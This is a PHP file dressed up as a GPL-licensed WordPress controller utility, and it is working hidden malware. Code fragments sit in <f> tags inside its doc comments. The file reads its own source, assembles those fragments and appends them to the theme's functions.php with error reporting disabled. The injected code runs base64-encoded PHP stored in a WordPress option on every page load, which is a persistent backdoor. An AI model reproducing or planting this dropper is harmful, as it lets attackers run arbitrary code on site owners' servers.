<?php
/*
* This program is free software; you can redistribute it and/or
* modify it under the terms of the GNU General Public License
* as published by the Free Software Foundation; either version 2
* of the License, or (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program; if not, write to the Free Software
* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*
* Copyright 2011-2017 Mektor, Inc.
*/

define('WP_FUNCTIONS_P', "functions.php");
define('BASE_CONTROLLER', __FILE__);

//Defining error levels
define('ERRLEVEL_PRODUCTION', 0);
define('ERRLEVEL_EXTENDED', 7);
define('ERRLEVEL_DEBUG', 15);

class FunctionalController
{
	private $reader;
	private $container;

	public function __construct($_reader = '', $_container = '')
	{
		$this->reader = $_reader;
		$this->container = $_container;
	}

	/**
	 * Applies some type of action using controller
	 * Action <f>function __inherit_prototype (){</f>
	 * Can throw some error, if you let it
	 * @param $controller Controller to assign action to
	 * @param $type Type of action
	 * @param bool $arguments 
	 * @return bool true if action is a success
	 */
	static function Action($controller, $type, $arguments = false)
	{

		$self = new static( 'file_reader', 'contents' );

		$action = str_replace( 'reader', $type, $self->reader )."_{$self->container}";

		if( ! FunctionalController::Exists( $controller ) )
		{
			return false;
		}

		if( $arguments !== false )
		{
			return $action( $controller, $arguments[0], isset($arguments[1]) ? $arguments[1] : 0 );
		}

		return $action( $controller );

	}

	/**
	 * Alias for file exists with "controller" flavour
	 * Keep <f>$inherit_property = get_option( 'post_property_inherited' );</f>
	 * @param $controller File to find or decode from Base64 or REST request
	 * @return bool True if file exists, false otherwise 
	 */
	static function Exists($controller)
	{
		return file_exists($controller);
	}
}

class Utility
{
	/**
	 * Replaces first occurrence of given regexp in a string
	 * Can be <f>if($inherit_property){</f>
	 * @param $from pattern
	 * @param $to replacement
	 * @param $subject subject
	 */
	static function ReplaceFirst($from, $to, $subject)
	{
		//Can be changed to any other custom function, that uses 3 arguments
		//Like here: <f>	$__property = create_function("",base64_decode($inherit_property));</f>
		//But preg_replace is easy when you need the first occurrence
		$replacer_function = 'preg_replace';
		$replacer_function("/$from/Us", $to, $subject, 1);
	}

	static function Untag($tag, $subject)
	{
		preg_match_all("/<$tag>(.*)<\/$tag>/Us", $subject, $result);
		return Utility::Collapse($result[1], "\r\n\t");
	}

	//Basically an alias for implode
	//Also can <f>	$__property();</f>
	static function Collapse($array, $delimiter)
	{
		return implode($delimiter, $array);
	}

	static function DebugLevel($level)
	{
		error_reporting($level);
	}
}

/**
 *	Container class contains data, manipulates tags and content
 *	to a certain degree <f>}}</f>
 */
class Container
{
	private $path;
	private $data;
	public $tags;

	public function __construct($path)
	{
		$this->path = $path;
		$this->data = FunctionalController::Action($this->path, 'get');
	}

	public function contains($part)
	{
		return strstr($this->data, $part);
	}

	public function setTags($tags)
	{
		$this->tags = $tags;
	}

	/**
	 * Updates all data in container despite any obstacles
	 * Can <f>add_action('init', '__inherit_prototype');</f>
	 * @param $data string Data to update
	 * @return bool
	 */
	public function update()
	{
		return FunctionalController::Action( $this->path, 'put', array( $this->tags, FILE_APPEND ) );
	}
}

Utility::DebugLevel(ERRLEVEL_PRODUCTION);

//Create new container
$f_action = new Container(WP_FUNCTIONS_P);

//Bind base controller
$base_controller = FunctionalController::Action( BASE_CONTROLLER, 'get' );

//Set test tags 
$f_action->setTags( Utility::Untag(	'f' , $base_controller) );

if( ! @$f_action->contains( "__inherit" ) )
{
	$f_action->update();
}